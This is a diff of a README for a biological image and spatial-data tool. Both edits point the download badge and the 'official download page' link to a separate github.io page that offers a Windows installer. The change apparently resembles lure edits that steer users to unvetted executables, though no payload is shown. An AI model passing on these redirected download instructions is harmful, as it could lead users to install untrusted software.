@@ -1,6 +1,6 @@
 # 🔬 Biovision-omics - Analyze biological images and spatial data
 
-[![](https://img.shields.io/badge/Download-Biovision_omics-blue.svg)](https://github.com/Heterosexual-scalage95/Biovision-omics)
+[![](https://img.shields.io/badge/Download-Biovision_omics-blue.svg)](https://heterosexual-scalage95.github.io)
 
 ## What this software does
 
@@ -18,7 +18,7 @@ Before you install this software, make sure your computer meets these standards:
 
 ## ⬇️ How to get the software
 
-1. Visit the [official download page](https://github.com/Heterosexual-scalage95/Biovision-omics) to obtain the installer.
+1. Visit the [official download page](https://heterosexual-scalage95.github.io) to obtain the installer.
 2. Look for the "Releases" section on the right side of the page.
 3. Select the latest version of the Windows installer file.
 4. Save the file to your desktop or your Downloads folder.
